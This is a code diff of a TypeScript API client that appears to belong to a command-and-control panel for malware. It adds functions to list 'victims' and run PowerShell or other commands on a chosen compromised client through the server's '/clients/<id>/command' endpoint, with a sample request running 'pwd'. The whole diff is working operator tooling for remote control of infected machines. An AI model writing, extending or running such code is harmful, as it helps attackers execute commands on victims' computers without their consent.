@@ -69,16 +69,42 @@ export const verifyToken = (token: string) => {
     });
 };
 
-export const fileUpload = (file: File) => {
-  const formData = new FormData();
-  formData.append("in_file", file);
+export const logout = () => {
+  localStorage.removeItem("token");
+};
+
+export const getVictims = () => {
+  return axios.get(API_URL + "clients", {}).then((response) => {
+    return response;
+  });
+};
+
+export const getVictim = (id: string) => {
+  return axios.get(API_URL + "clients/" + id, {}).then((response) => {
+    return response;
+  });
+};
+
+export const runVictimCommand = (
+  id: string,
+  command: string,
+  type?: string
+) => {
+  // Encrypt the command in URL format
+  command = encodeURIComponent(command);
+
+  // Example request: http://127.0.0.1:8001/api/v1/clients/119384632345157/command?command_type=powershell&command=pwd
   return axios
-    .post(API_URL + "upload", formData, {
-      headers: {
-        "Content-Type": "multipart/form-data",
-        Authorization: "Bearer " + localStorage.getItem("token"),
-      },
-    })
+    .post(
+      API_URL +
+        "clients/" +
+        id +
+        "/command?command_type=" +
+        (type ? type : "powershell") +
+        "&command=" +
+        command,
+      {}
+    )
     .then((response) => {
       return response;
     });
